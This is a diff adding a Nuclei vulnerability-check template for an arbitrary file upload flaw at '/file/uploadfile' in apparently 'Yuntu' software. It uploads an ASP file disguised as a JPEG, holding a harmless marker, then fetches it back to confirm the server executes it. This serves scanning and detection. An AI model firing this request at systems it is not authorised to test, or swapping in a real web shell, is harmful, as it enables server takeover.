@@ -1,0 +1,48 @@
+id: yuntu-uploadfile-fileupload
+
+info:
+  name: yuntu-uploadfile-fileupload
+  author: HuanXiong
+  severity: critical
+
+  tags: File Upload
+
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+
+http:
+  - raw:
+    - | 
+      POST /file/uploadfile HTTP/1.1
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+      Host: {{Hostname}}
+      Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+      Content-Length: 366
+      Connection: close
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="file"; filename="{{filename}}.asp"
+      Content-Type: image/jpeg
+
+      <%Response.Write("stctest")%>
+      --00content0boundary00--
+    
+    - |
+      GET {{uploadfilename}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: text/plain
+      Connection: close
+    
+    extractors:
+      - type: regex
+        name: uploadfilename
+        group: 0
+        regex: 
+         - '/uploadfile/0/([^"]+)\.asp'
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body_2,"stctest")
